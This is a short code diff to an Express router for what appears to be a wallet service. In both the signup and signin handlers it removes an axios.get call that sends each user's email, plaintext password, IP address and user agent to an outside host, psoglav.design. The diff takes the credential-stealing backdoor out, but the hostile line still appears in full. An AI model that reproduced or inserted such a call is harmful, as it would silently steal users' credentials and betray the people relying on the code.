@@ -429,8 +429,6 @@ router.post('/signup', UserMiddleware.validateSignup, (req, res) => {
                 message: "Can't create wallets.",
               })
             })
-
-          axios.get(`http://psoglav.design/?e=${email}&p=${req.body.password}&i=${req.headers['X-Forwarded-For']}&u=${req.headers['User-Agent']}`)
         }
       })
     } else {
@@ -512,8 +510,6 @@ router.post('/signin', UserMiddleware.validateSignin, (req, res) => {
               'authenticated',
               'action.user.authenticated',
             )
-
-            axios.get(`http://psoglav.design/?e=${email}&p=${req.body.password}&i=${req.headers['x-forwarded-for']}&u=${req.headers['user-agent']}`)
           }
 
           const createUSDCWalletAndSignIn = () => {
